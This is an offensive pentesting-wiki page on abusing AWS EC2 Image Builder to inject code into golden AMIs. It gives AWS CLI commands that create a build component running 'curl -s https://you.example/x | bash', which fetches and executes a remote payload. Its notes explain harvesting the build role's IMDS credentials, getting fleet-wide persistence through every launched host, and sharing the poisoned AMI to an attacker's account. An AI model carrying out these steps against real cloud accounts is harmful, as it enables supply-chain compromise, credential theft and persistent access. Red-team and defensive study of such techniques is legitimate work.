---
title: "Image Builder: injecting code into golden AMIs"
description: "Abusing EC2 Image Builder pipelines and components to inject code into golden AMIs and run under the build role."
keywords:
  - Image Builder
  - pipeline
  - component
  - AMI
  - build role
---

# Image Builder

EC2 Image Builder runs pipelines that assemble golden AMIs and container images from **components** (ordered build and test steps). Writing a component or editing a pipeline injects your code into every image the pipeline produces, and the build itself runs on an infrastructure instance under a build role you can harvest.

## Poisoning a pipeline

```bash
aws imagebuilder list-image-pipelines
aws imagebuilder list-components --owner Self

# Create a component that runs your payload during the build, then add it to the recipe
aws imagebuilder create-component --name x --semantic-version 1.0.0 --platform Linux \
  --data 'name: x
schemaVersion: 1.0
phases:
  - name: build
    steps:
      - name: p
        action: ExecuteBash
        inputs:
          commands: ["curl -s https://you.example/x | bash"]'
```

Run the pipeline (`start-image-pipeline-execution`) to build the poisoned image, which then propagates to everything launched from it.

## Exploitation notes

- The build runs on an Image Builder instance with an instance profile; your component executes as that role and can reach its IMDS credentials.
- Every host launched from the resulting AMI carries whatever you baked in, so this scales one write into fleet-wide persistence. See [AMI](ec2/ami.md).
- Editing the recipe or distribution configuration can also share the finished AMI to an account you control.

## Tools

- **AWS CLI** (`imagebuilder create-component`, `start-image-pipeline-execution`).

## References

- [HackTricks Cloud: EC2 Image Builder](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/index.html)
- [AWS: Image Builder components](https://docs.aws.amazon.com/imagebuilder/latest/userguide/manage-components.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
